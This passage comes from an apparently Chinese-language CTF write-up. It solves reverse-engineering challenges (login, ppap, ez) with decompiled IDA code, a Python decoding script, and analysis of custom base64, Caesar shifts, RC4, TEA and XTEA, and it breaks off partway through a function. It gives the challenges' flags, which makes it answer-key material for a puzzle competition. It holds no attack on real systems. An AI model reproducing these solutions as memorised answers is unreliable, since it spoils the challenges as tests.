class="line">array2[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array2[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array3[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array3[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array3[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array3[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line">array4[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array2);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array3);</span><br><span class="line"><span class="built_in">Encrypt1</span>(array4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt1</span><span class="params">(<span class="keyword">char</span>[] string1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num = string1.Length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] = (<span class="keyword">char</span>)(string1[i] - <span class="number">31</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">string1[i] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] = (<span class="keyword">char</span>)(string1[i] + <span class="number">33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">string1[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (string1[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; string1[i] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string1[i] == <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">string1[i] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">string1[i] = (<span class="keyword">char</span>)(string1[i] + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看Main()，按逻辑得 <code>array1~4</code> 分别为 <code>mDDO,T&#123;gD,009_,bSE&#125;</code>，再看Encrypt1()，<code>a-z</code>移位-31，<code>A-Z</code>移位33，<code>0-9</code> 移位1，操作后得 <code>Neepu&#123;He110_Ctf&#125;</code>。</p><p>​    </p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><blockquote><p>login in please :)</p></blockquote><p>login文件夹里包含usrs_info2.pickle序列化文件，确定是python程序。</p><p>pyinstxtractor解包exe为pyc，再uncompyle6反编译<code>retest2.pyc</code>为python源码，找到flag。</p><p>​    </p><h3 id="ppap"><a href="#ppap" class="headerlink" title="ppap"></a>ppap</h3><blockquote><p>最近小猫爱上了闯关</p></blockquote><p>查壳发现upx壳，工具脱壳。</p><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">  sub_40DA40();</span><br><span class="line">LABEL_2:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ppap&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The cat is very cute, do you like it?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;My cat is lost, help me&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your cat&#x27;s name&#x27;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me 1+2=?&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%256s\n&quot;</span>, Str);                        <span class="comment">//输入字符串</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  v11 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sub_401500(Str, v3);      <span class="comment">//v11 = 输入字符串的base64编码（自定义码表）</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">strlen</span>(v11) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v7[i] = v11[i];                             <span class="comment">//v7 = v11</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&quot;</span>);</span><br><span class="line">                                                <span class="comment">//v8 = WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc</span></span><br><span class="line">  <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">  sub_40167D(v7);                               <span class="comment">//对v7做第一次处理，函数sub_40167D()</span></span><br><span class="line">  sub_401746(v7);                               <span class="comment">//对v7做第二次处理，函数sub_401746()</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = j;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= <span class="built_in">strlen</span>(v7) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7[j] != v8[j] )                       <span class="comment">//比较v7 == v8？</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ppap&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yes, you are right&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40167D()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_40167D</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">96</span> || Str[i] &gt; <span class="number">122</span> )</span><br><span class="line">        Str[i] = Str[i];</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        Str[i] -= <span class="number">32</span>;                         <span class="comment">//96&lt;字符ascii值&lt;=122，字符移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] += <span class="number">32</span>;                           <span class="comment">//64&lt;字符ascii值&lt;=90，字符移位</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_401746()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">sub_401746</span><span class="params">(<span class="keyword">char</span> *Str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(Str); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( Str[i] &lt;= <span class="number">64</span> || Str[i] &gt; <span class="number">90</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[i] &gt; <span class="number">96</span> &amp;&amp; Str[i] &lt;= <span class="number">122</span> )</span><br><span class="line">        Str[i] = (Str[i] - <span class="number">97</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">97</span>;     <span class="comment">//96&lt;字符ascii值&lt;=122，字符循环移位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Str[i] = (Str[i] - <span class="number">65</span> + <span class="number">3</span>) % <span class="number">26</span> + <span class="number">65</span>;       <span class="comment">//64&lt;字符ascii值&lt;=90，字符循环移位</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>v8</code> 字符串先按函数 <code>sub_401746()</code>还原，再按函数 <code>sub_40167D()</code>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&#x27;</span></span><br><span class="line">s=<span class="built_in">list</span>(s.encode())</span><br><span class="line"></span><br><span class="line">t=[-<span class="number">1</span>]*<span class="built_in">len</span>(s)</span><br><span class="line">tt=[-<span class="number">1</span>]*<span class="built_in">len</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">c=j</span><br><span class="line"><span class="keyword">if</span> c&lt;=<span class="number">64</span> <span class="keyword">or</span> c&gt;<span class="number">90</span>:</span><br><span class="line"><span class="keyword">if</span> c&gt;<span class="number">96</span> <span class="keyword">and</span> c&lt;=<span class="number">122</span>:</span><br><span class="line">c=(c-<span class="number">97</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c=(c-<span class="number">65</span>+<span class="number">3</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line"><span class="keyword">if</span> c==s[i]:</span><br><span class="line">t[i]=j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">c=j</span><br><span class="line"><span class="keyword">if</span> c&lt;=<span class="number">64</span> <span class="keyword">or</span> c&gt;<span class="number">90</span>:</span><br><span class="line"><span class="keyword">if</span> c&lt;=<span class="number">96</span> <span class="keyword">or</span> c&gt;<span class="number">122</span>:</span><br><span class="line">c=c</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c-=<span class="number">32</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">c+=<span class="number">32</span></span><br><span class="line"><span class="keyword">if</span> c==t[i]:</span><br><span class="line">tt[i]=j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(tt))</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密得密文：tCvB2hvXuS77mvZQytf5wwfKzRZezvZUmweMxSN71BZJyub54wfZ</span></span><br><span class="line"><span class="comment">#自定义码表：a-z0-9A-Z+/=</span></span><br></pre></td></tr></table></figure><p>解自定义码表下的base64得flag。</p><p>​    </p><h3 id="ez"><a href="#ez" class="headerlink" title="ez"></a>ez</h3><blockquote><p>Do you like basketball?</p></blockquote><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">sub_40E3F0();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Do you like basketball?&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Source);                                            <span class="comment">//输入字符串Source</span></span><br><span class="line"><span class="built_in">strcpy</span>(Destination, Source);                                    <span class="comment">//Dest = Source</span></span><br><span class="line"><span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line"><span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">sub_40235D(Source, v7, <span class="string">&quot;flag&#123;Would_you_like_basketball?&#125;&quot;</span>);     <span class="comment">//函数sub_40235D(Source,out,key) （RC4+base64）</span></span><br><span class="line">v28 = <span class="number">32</span>;</span><br><span class="line">v24[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">v24[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">v24[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">v24[<span class="number">3</span>] = <span class="number">4</span>;                                                     <span class="comment">//v24 = [2,2,3,4]</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;please input your lucky number&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v25 + i);                                        <span class="comment">//输入v25,v26</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v22 + j);                                        <span class="comment">//输入v22,v23</span></span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">1</span>; ++k )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v20 + k);                                        <span class="comment">//输入v20,v21</span></span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">1</span>; ++l )</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v18 + l);                                        <span class="comment">//输入v18,v19</span></span><br><span class="line">v4[<span class="number">0</span>] = v25;</span><br><span class="line">v4[<span class="number">1</span>] = v26;</span><br><span class="line">v4[<span class="number">2</span>] = v22;</span><br><span class="line">v4[<span class="number">3</span>] = v23;</span><br><span class="line">v4[<span class="number">4</span>] = v20;</span><br><span class="line">v4[<span class="number">5</span>] = v21;</span><br><span class="line">v4[<span class="number">6</span>] = v18;</span><br><span class="line">v4[<span class="number">7</span>] = v19;                                                    <span class="comment">//v4 = [v25,v26,v22,v23,v20,v21,v18,v19]</span></span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">7</span>; ++m )                                      <span class="comment">//对v4冒泡排序（升序）</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">7</span>; n &gt; m; --n )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[n] &lt; v4[n - <span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      v27 = v4[n];</span><br><span class="line">      v4[n] = v4[n - <span class="number">1</span>];</span><br><span class="line">      v4[n - <span class="number">1</span>] = v27;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">sub_40152F(&amp;v25, v24);                                          <span class="comment">//函数sub_40152F() （TEA加密）</span></span><br><span class="line">sub_40152F(&amp;v22, v24);                                          <span class="comment">//函数sub_40152F() （TEA加密）</span></span><br><span class="line">sub_4015FD(v28, &amp;v20, v24);                                     <span class="comment">//函数sub_4015FD() （XTEA加密）</span></span><br><span class="line">sub_4015FD(v28, &amp;v18, v24);                                     <span class="comment">//函数sub_4015FD() （XTEA加密）</span></span><br><span class="line"><span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line">v9[<span class="number">0</span>] = <span class="number">81</span>;                                                     <span class="comment">//v9</span></span><br><span class="line">v9[<span class="number">1</span>] = <span class="number">116</span>;</span><br><span class="line">......</span><br><span class="line">v9[<span class="number">46</span>] = <span class="number">7</span>;</span><br><span class="line">v9[<span class="number">47</span>] = <span class="number">8</span>;</span><br><span class="line">v16 = <span class="number">-1621115832</span>;                                              <span class="comment">//v10~v17，8个hex</span></span><br><span class="line">v17 = <span class="number">-984516975</span>;</span><br><span class="line">v14 = <span class="number">616429839</span>;</span><br><span class="line">v15 = <span class="number">807110888</span>;</span><br><span class="line">v12 = <span class="number">-1837822886</span>;</span><br><span class="line">v13 = <span class="number">-1596355058</span>;</span><br><span class="line">v10 = <span class="number">-1915738221</span>;</span><br><span class="line">v11 = <span class="number">1331005540</span>;</span><br><span class="line"><span class="keyword">if</span> ( v25 != <span class="number">-1621115832</span>                                         <span class="comment">//v25,v26,v22,v23,v20,v21,v18,v19 == v10~v17</span></span><br><span class="line">  || v26 != v17</span><br><span class="line">  || v14 != v22</span><br><span class="line">  || v15 != v23</span><br><span class="line">  || v12 != v20</span><br><span class="line">  || v13 != v21</span><br><span class="line">  || v10 != v18</span><br><span class="line">  || v11 != v19 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">47</span>; ++ii )</span><br><span class="line">  *(_DWORD *)&amp;v8[<span class="number">4</span> * ii + <span class="number">128</span>] = v4[ii % <span class="number">8</span>] ^ v7[ii];          <span class="comment">//v8 = v4^v7 </span></span><br><span class="line"><span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">47</span>; ++jj )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v9[jj] != *(_DWORD *)&amp;v8[<span class="number">4</span> * jj + <span class="number">128</span>] )                <span class="comment">//v9 == v8？</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Right,FLAG is Neepu&#123;%s&#125;\n&quot;</span>, Destination);</span><br><span class="line">system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40235D(Source,out,key)</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">sub_40235D</span><span class="params">(<span class="keyword">char</span> *Str, <span class="keyword">void</span> *a2, <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *Src; <span class="comment">// [esp+1Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="keyword">size_t</span> Size; <span class="comment">// [esp+20h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *Block; <span class="comment">// [esp+24h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// [esp+28h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v7; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( Str &amp;&amp; a2 &amp;&amp; a3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    v6 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">    Block = (<span class="keyword">void</span> *)sub_418710(v7 + <span class="number">1</span>);                <span class="comment">//初始化Block</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Block, Str, v7 + <span class="number">1</span>);</span><br><span class="line">    sub_401E22(Block, v7, a3, v6);                     <span class="comment">//RC4加密，Block = RC4(Str,key)</span></span><br><span class="line">    Size = <span class="number">0</span>;</span><br><span class="line">    Src = <span class="number">0</span>;</span><br><span class="line">    sub_4020DE(Block, v7, (<span class="keyword">int</span>)&amp;Src, (<span class="keyword">int</span>)&amp;Size);      <span class="comment">//Src = Block的base64编码（自定义码表）</span></span><br><span class="line">    <span class="keyword">if</span> ( Src )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(a2, Src, Size);                           <span class="comment">//a2 = Src</span></span><br><span class="line">      *((_BYTE *)a2 + Size) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( Src )</span><br><span class="line">        j_j_free(Src);</span><br><span class="line">      Src = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( Block )</span><br><span class="line">      j_j_free(Block);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数 <code>sub_40152F()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">sub_40152F</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, _DWORD *a2)</span>        <span class="comment">//TEA加密算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] 